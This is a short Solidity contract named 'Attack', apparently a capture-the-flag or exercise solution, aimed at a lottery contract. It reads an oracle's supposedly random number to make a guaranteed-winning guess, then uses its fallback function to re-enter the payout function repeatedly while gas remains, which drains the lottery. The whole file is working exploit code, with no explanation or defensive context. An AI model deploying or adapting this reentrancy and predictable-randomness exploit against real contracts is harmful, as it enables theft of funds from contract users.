pragma solidity 0.6.0;

interface IOracle {
    function getRandomNumber() external view returns (uint256);
}

interface ILottery {
    function makeAGuess(address _team, uint256 _guess) external returns (bool);

    function payoutWinningTeam(address _team) external returns (bool);
}

contract Attack {
    address public owner;
    ILottery public lottery;
    IOracle public oracle;

    constructor(address _lottery, address _oracle) public {
        owner = msg.sender;
        lottery = ILottery(_lottery);
        oracle = IOracle(_oracle);
    }

    function attack() external {
        lottery.makeAGuess(owner, oracle.getRandomNumber());
        lottery.payoutWinningTeam(owner);
    }

    fallback() external payable {
        if (gasleft() > 40000) {
            lottery.payoutWinningTeam(owner);
        }
    }
}
